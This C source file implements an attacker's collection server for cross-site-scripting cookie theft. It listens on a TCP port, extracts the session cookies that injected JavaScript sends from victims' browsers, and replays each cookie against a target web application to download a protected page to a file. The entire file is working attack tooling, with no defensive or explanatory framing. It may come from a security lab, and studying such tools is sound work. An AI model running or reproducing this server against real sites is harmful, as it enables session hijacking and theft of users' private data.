/*
 * cookie_logger.c
 *
 * Attacker HTTP collection server for XSS cookie exfiltration.
 *
 * Injected JavaScript (reflected, stored, or DOM-based) runs in the victim's
 * browser and sends document.cookie to this server as a query parameter. The
 * server listens on port 5555, extracts the cookie from each request, then
 * replays it against the target web application to fetch a protected resource,
 * saving that response to a file.
 *
 * The same binary serves all three XSS variants; the protected page to fetch
 * and the output file are given on the command line.
 *
 * Usage:
 *   ./cookie_logger <target_page> <output_file>
 */

#include "config.h"
#include "sockio.h"
#include "cookie.h"
#include "exfil.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define LISTEN_PORT     ATTACKER_PORT
#define REQUEST_BUFFER  4096
#define COOKIE_MAX_LEN  1024

/* Send a minimal HTTP response with an empty body. */
static void write_http_ok(int fd)
{
    const char *resp =
        "HTTP/1.1 200 OK\r\n"
        "Content-Length: 0\r\n"
        "Connection: close\r\n"
        "\r\n";
    (void)send_all(fd, resp, strlen(resp));
}

/* Create, bind, and listen on the collection TCP socket. Returns -1 on error. */
static int setup_server_socket(int port)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        return -1;
    }

    int opt = 1;
    (void)setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    opt = 1;
    (void)setsockopt(fd, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
    set_socket_timeouts(fd, SOCKET_TIMEOUT_SECONDS);

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons((uint16_t)port);

    if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0 ||
        listen(fd, 5) < 0) {
        close(fd);
        return -1;
    }
    return fd;
}

/* Read one request, extract the cookie, and (if present) replay it. */
static void handle_connection(int client_fd,
                              const char *target_page, const char *out_file)
{
    char buffer[REQUEST_BUFFER] = {0};
    ssize_t n = read(client_fd, buffer, sizeof(buffer) - 1);
    if (n <= 0) {
        return;
    }

    char cookie[COOKIE_MAX_LEN] = {0};
    extract_cookie(buffer, cookie, sizeof(cookie));
    if (cookie[0] != '\0') {
        fetch_with_cookie(cookie, target_page, out_file);
    }
    write_http_ok(client_fd);
}

int main(int argc, char **argv)
{
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <target_page> <output_file>\n", argv[0]);
        return 1;
    }
    const char *target_page = argv[1];
    const char *out_file = argv[2];

    int server_fd = setup_server_socket(LISTEN_PORT);
    if (server_fd < 0) {
        fprintf(stderr, "Error: could not open listening socket.\n");
        return 1;
    }

    for (;;) {
        struct sockaddr_in client;
        socklen_t client_len = (socklen_t)sizeof(client);
        int client_fd = accept(server_fd, (struct sockaddr *)&client, &client_len);
        if (client_fd < 0) {
            continue; /* ignore accept errors and keep serving */
        }
        set_socket_timeouts(client_fd, SOCKET_TIMEOUT_SECONDS);
        handle_connection(client_fd, target_page, out_file);
        close(client_fd);
    }

    close(server_fd);
    return 0;
}
